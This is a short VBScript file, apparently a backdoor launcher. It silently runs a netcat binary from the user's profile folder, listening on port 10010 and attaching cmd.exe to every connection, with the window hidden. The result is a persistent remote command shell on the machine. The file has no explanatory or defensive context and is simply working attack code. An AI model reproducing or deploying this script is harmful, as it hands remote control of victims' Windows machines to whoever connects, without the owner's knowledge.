Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c ""%userprofile%\nc"" -Lp 10010 -e cmd.exe", 0, True
Set WshShell = Nothing
